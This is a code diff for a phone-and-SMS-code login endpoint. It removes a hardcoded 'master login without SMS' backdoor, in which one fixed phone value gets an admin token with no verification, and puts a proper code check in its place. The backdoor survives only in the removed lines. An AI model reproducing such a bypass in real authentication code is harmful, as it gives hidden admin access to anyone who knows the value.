@@ -1,25 +1,13 @@
-import { sign } from "@/lib/auth";
-
-let codes: any = {};
+import { verifyCode } from "@/lib/auth";
 
 export async function POST(req: Request) {
   const { phone, code } = await req.json();
 
-  // 🔑 мастер-вход без SMS
-  if (phone === "140578") {
-    const token = sign({
-      phone: "admin",
-      role: "admin"
-    });
+  const ok = verifyCode(phone, code);
 
-    return Response.json({ token });
+  if (!ok) {
+    return Response.json({ success: false }, { status: 401 });
   }
 
-  if (codes[phone] != code) {
-    return Response.json({ error: "Неверный код" }, { status: 400 });
-  }
-
-  const token = sign({ phone });
-
-  return Response.json({ token });
-      }
+  return Response.json({ success: true });
+}
